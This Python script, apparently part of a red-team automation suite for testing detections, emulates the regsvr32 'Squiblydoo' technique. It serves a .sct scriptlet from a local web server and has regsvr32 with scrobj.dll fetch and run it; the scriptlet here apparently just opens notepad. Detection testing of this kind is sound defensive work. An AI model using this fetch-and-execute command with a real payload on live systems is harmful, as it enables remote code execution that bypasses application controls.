# Name: RegSvr32 Backdoor with .sct Files
# rta: regsvr32_scrobj.py
# ATT&CK: T1121, T1117, T1064
# Description: Loads a .sct network callback with RegSvr32

import common

# Ref. regsvr32
#      https://en.wikipedia.org/wiki/Regsvr32
#      https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32

@common.dependencies(common.get_path("bin", "notepad.sct"))
def main():
    common.log("RegSvr32 with .sct backdoor")
    server, ip, port = common.serve_web()
    common.clear_web_cache()

    uri = 'bin/notepad.sct'
    url = 'http://%s:%d/%s' % (ip, port, uri)

    # Ref. https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
    common.execute(["regsvr32.exe", "/u", "/n", "/s", "/i:%s" % url, "scrobj.dll"])
    common.log("Killing all notepads to cleanup", "-")
    common.execute(["taskkill", "/f", "/im", "notepad.exe"])

    server.shutdown()
    

if __name__ == "__main__":
    exit(main())
